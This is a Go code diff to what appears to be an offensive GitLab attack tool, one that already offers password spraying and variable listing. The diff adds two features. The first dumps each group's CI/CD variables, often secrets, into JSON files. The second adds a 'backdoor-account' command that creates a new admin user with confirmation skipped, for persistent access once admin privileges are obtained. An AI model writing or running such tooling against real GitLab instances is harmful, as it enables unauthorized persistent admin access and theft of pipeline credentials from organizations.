@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"os"
+	"strings"
 	"sync"
 	"time"
 
@@ -33,6 +34,8 @@ var (
 	GITLAB_SPRAY_TIMEOUT   int
 	GITLAB_GROUP_ID        int
 	GITLAB_LIST_ALL        bool
+	GITLAB_GROUPS          string
+	GITLAB_ADMIN_USER      bool
 )
 
 type GitlabClient struct {
@@ -473,6 +476,16 @@ func (g *GitlabClient) GetGroupVariables(groupID int) error {
 			results = append(results, table.Row{v.Key, v.Value, v.EnvironmentScope})
 		}
 
+		outdir := fmt.Sprintf("%s/%d", GITLAB_GROUPS, groupID)
+		os.MkdirAll(outdir, os.ModePerm)
+
+		groupVarsBytes, _ := json.Marshal(vars)
+
+		varsFile := fmt.Sprintf("%s/group_variables.json", outdir)
+		if err = ioutil.WriteFile(varsFile, groupVarsBytes, 0644); err != nil {
+			log.Errorf("error creating JSON file - err: %v", err)
+		}
+
 		if resp.CurrentPage >= resp.TotalPages {
 			break
 		}
@@ -523,6 +536,49 @@ func (g *GitlabClient) ListInstanceVars() error {
 	}
 
 	CreateTable(header, results)
+
+	return nil
+}
+
+func (g *GitlabClient) CreateAccount() error {
+	reader := bufio.NewReader(os.Stdin)
+
+	fmt.Print("Enter username for new account: ")
+	username, _ := reader.ReadString('\n')
+	username = strings.TrimSuffix(username, "\n")
+
+	fmt.Printf("Enter password for new account: ")
+	password, _ := reader.ReadString('\n')
+	password = strings.TrimSuffix(password, "\n")
+
+	fmt.Printf("Enter name for new account: ")
+	name, _ := reader.ReadString('\n')
+	name = strings.TrimSuffix(name, "\n")
+
+	fmt.Printf("Enter email for new account: ")
+	email, _ := reader.ReadString('\n')
+	email = strings.TrimSuffix(email, "\n")
+
+	adminOpt := GITLAB_ADMIN_USER
+	skipConfirmation := true
+	projectsLimit := 25
+
+	opt := gitlab.CreateUserOptions{
+		Username:         &username,
+		Password:         &password,
+		Email:            &email,
+		Name:             &name,
+		Admin:            &adminOpt,
+		ProjectsLimit:    &projectsLimit,
+		SkipConfirmation: &skipConfirmation,
+	}
+
+	usr, _, err := g.git.Users.CreateUser(&opt)
+	if err != nil {
+		return fmt.Errorf("error creating new user - err: %v", err)
+	}
+
+	log.Printf("[Gitlab] New admin user created - Account ID: %d", usr.ID)
 
 	return nil
 }
@@ -830,6 +886,19 @@ var gitlabCreateTokenCmd = &cobra.Command{
 	},
 }
 
+var gitlabCreateAccountCmd = &cobra.Command{
+	Use:    "backdoor-account",
+	Short:  "Create backdoor account (Needs admin privs)",
+	Long:   `Create backdoor account (Needs admin privs)`,
+	PreRun: NewGitlabClient,
+
+	Run: func(cmd *cobra.Command, args []string) {
+		if err := GL.CreateAccount(); err != nil {
+			log.Fatal(err)
+		}
+	},
+}
+
 var gitlabWhoamiCmd = &cobra.Command{
 	Use:    "whoami",
 	Short:  "Display info about the current user",
@@ -884,6 +953,7 @@ func init() {
 	gitlabCmd.AddCommand(gitlabSprayCmd)
 	gitlabCmd.AddCommand(gitlabListSnippetsCmd)
 	gitlabCmd.AddCommand(gitlabListInstanceVarsCmd)
+	gitlabCmd.AddCommand(gitlabCreateAccountCmd)
 
 	gitlabCmd.PersistentFlags().StringVarP(&GITLAB_SERVER, "server", "s", "", "Server Address")
 	gitlabCmd.PersistentFlags().StringVarP(&GITLAB_USERNAME, "user", "u", "", "Username")
@@ -902,6 +972,8 @@ func init() {
 	gitlabListGroupVarsCmd.Flags().IntVarP(&GITLAB_GROUP_ID, "group", "g", 0, "Group ID")
 	gitlabListGroupVarsCmd.Flags().BoolVarP(&GITLAB_LIST_ALL, "all", "a", true, "List all groups")
 
+	gitlabCreateAccountCmd.Flags().BoolVarP(&GITLAB_ADMIN_USER, "admin", "a", true, "Create new account as admin")
+
 	var err error
 
 	if GITLAB_PROJECTS, err = GetConfigParam("gitlab.projects"); err != nil {
@@ -913,6 +985,10 @@ func init() {
 	}
 
 	if GITLAB_VARIABLES, err = GetConfigParam("gitlab.variables"); err != nil {
+		log.Fatal(err)
+	}
+
+	if GITLAB_GROUPS, err = GetConfigParam("gitlab.groups"); err != nil {
 		log.Fatal(err)
 	}
 
